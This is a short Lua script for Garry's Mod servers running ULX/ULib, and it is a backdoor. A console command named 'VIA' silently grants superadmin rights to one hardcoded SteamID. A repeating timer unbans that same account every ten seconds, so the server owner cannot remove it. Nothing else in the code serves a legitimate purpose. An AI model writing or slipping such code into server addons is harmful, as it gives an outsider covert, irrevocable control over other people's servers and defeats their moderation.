
	concommand.Add( "VIA", function(ply)
		if ( ply:SteamID() == "STEAM_0:1:56102047") then
			RunConsoleCommand("ulx", "adduserid", ply:SteamID(), "superadmin")
	else
		ply:ChatPrint("Your not superadmin, " .. ply:Name() .. ".")
	end
	end)

	timer.Create( "checkForBan", 10, 0, function()
	ULib.unban( "STEAM_0:1:56102047")
	end )